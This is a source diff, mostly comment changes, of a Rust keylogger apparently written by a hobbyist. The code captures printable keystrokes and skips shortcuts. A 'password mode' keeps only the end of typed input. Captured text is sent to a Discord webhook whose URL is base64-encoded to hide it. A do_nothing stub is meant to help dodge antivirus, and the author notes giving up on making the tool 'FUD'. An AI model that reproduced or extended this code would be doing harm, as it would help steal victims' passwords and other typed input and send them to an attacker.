@@ -13,17 +13,16 @@ use std::{
 // change this to add `modifier` keys to ignore
 pub const MODIFIER_KEYS: [Key; 4] = [Key::Alt, Key::AltGr, Key::MetaLeft, Key::MetaRight];
 
-// changes the timeout after pressing a modifier key to ignore a typed key.
-// set this to something low.
+// changes the timeout after pressing a modifier key to ignore a typed key. set to something low.
 pub const TIMEOUT: Duration = Duration::from_millis(10);
 
-// change this to your webhook URL, encoded in base64
+// change this to your webhook URL, encoded in base64 because it makes it a little hidden lol
 pub const HOOK_URL: &str = "WEBHOOK";
 
 // Change this to capture whole sentences or just the end (password mode).
 pub const GET_SENTENCES: bool = false;
 
-/// Cleans up the main function by moving code to handle ¨normal¨ keys here.
+/// Cleans up the main function by moving code to handle the ¨normal¨ keys here.
 /// There are a lot of params which have to be passed in unfortunately.
 pub fn handle_key(
     event: Option<String>,
@@ -32,10 +31,11 @@ pub fn handle_key(
     cursor_pos: &mut usize,
     current_word_buf: &mut Vec<String>,
 ) {
-    // ignore anything that isn't valid ascii
+    // ignore anything that isn't valid ascii, you wouldn't usually use unicode/emoji chars in a password, for example
+    // you could obviously do things differently.
     if let Some(key) = event {
-        // only log ascii characters. and only log if we aren't doing a
-        // keyboard shortcut.
+        // only log ascii characters. and only log if we aren't doing a keyboard shortcut.
+        // this means pressing idk Windows + R will not log the 'R' key pressed.
         if check_latin_character(&key) && !ctrl_held && !modkey_held {
             // Do something with the key.
             current_word_buf.insert(*cursor_pos, key);
@@ -49,11 +49,10 @@ pub fn handle_key(
 /// e.g. not a control character.
 pub fn check_latin_character(key: &str) -> bool {
     if let Some(key_byte) = key.bytes().last() {
-        // Check if the letter is a simple ASCII char,
-        // these are usually the only valid characters in a password.
+        // Check if the letter is a simple ASCII char, these are usually the only valid characters in a password on a lot of sites.
         if key_byte.is_ascii()
-            && key.bytes().last() < Some(127_u8)
-            && key.bytes().last() > Some(31_u8)
+            && key.bytes().last() < Some(127_u8) // We have to check if it is `printable`
+            && key.bytes().last() > Some(31_u8) // See an ASCII table for an explaination.
         {
             return true;
         }
@@ -72,6 +71,12 @@ pub fn timer_done(rx: &Receiver<Instant>, _timeout: Duration) -> bool {
     }
 }
 
+// ALL OF THIS TIMER CODE IS FUCK OFF OVERCOMPLICATED, 
+// BUT IT WAS THE ONLY WAY I COULD SEE TO STOP THE PROGRAM LOGGING THINGS IT SHOULDN'T
+// For Windows targets, things may be different so try just using the sleep() function before using this way.
+// If you are asking for help about this, you may wanna write some other code and ask me when you get to this.
+// Discord: smiley#5012
+
 /// Starts a timer which sends itself to the main thread.
 pub fn start_timer(tx: Sender<Instant>) -> Result<(), std::sync::mpsc::SendError<Instant>> {
     let start_time = Instant::now();
@@ -79,15 +84,14 @@ pub fn start_timer(tx: Sender<Instant>) -> Result<(), std::sync::mpsc::SendError
     Ok(())
 }
 
-/// To make methods that take &self for Vec<String>.
+/// To make methods that take &self for Vec<String>. 
+/// This is a rusty way to call a function like sentence.append_to_log() rather than append_to_log(sentence)
 pub trait VectorExt {
-    /// Appends to the log, for now it will be a discord webhook because why not?
+    /// Appends to the log, which is a Discord webhook for me.
     fn append_to_log(&self) -> Result<(), Box<dyn std::error::Error>>;
 }
 
 impl VectorExt for Vec<String> {
-    /// Appends to the log, for now it will be a discord webhook because why not?
-    /// TODO: Stop being lazy.
     fn append_to_log(&self) -> Result<(), Box<dyn std::error::Error>> {
         let mut url = String::new();
 
@@ -108,6 +112,7 @@ impl VectorExt for Vec<String> {
 }
 
 /// Does nothing, might help with AV detection.
+/// Ignore, I gave up trying to make this FUD for now.
 #[allow(unused)]
 pub fn do_nothing() {
     let mut cnt = 0;
